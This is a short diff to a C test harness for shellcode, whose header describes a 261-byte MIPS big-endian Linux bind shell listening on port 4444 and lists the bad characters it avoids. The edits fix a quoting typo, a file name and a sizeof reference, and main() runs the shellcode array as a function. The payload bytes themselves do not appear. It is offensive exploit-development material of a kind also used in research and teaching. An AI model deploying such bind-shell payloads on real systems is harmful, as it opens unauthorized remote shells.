@@ -2,8 +2,8 @@
  *    - 261 bytes 
  *    - linux bind shell on port 4444
  *    - based on azeria's guide for ARM https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/
- *    - Avoids use of bad char's [ "\x00", "\x0a", \x0d", "\x20", "\x25", "\x3d" ]
- *    - ASM can be found in file 'mipsbe_bindshell.asm'
+ *    - Avoids use of bad char's [ "\x00", "\x0a", "\x0d", "\x20", "\x25", "\x3d" ]
+ *    - ASM can be found in file 'mipsbe_bindshell01.asm'
  */
 
 #include <stdio.h>
@@ -14,7 +14,7 @@ char shellcode[] = {
 
 void main(void) {
     void (*s)(void);
-    printf("Size of sc: %d\n", sizeof(sc));
+    printf("Size of sc: %d\n", sizeof(shellcode));
     s = shellcode;
     s();
 }
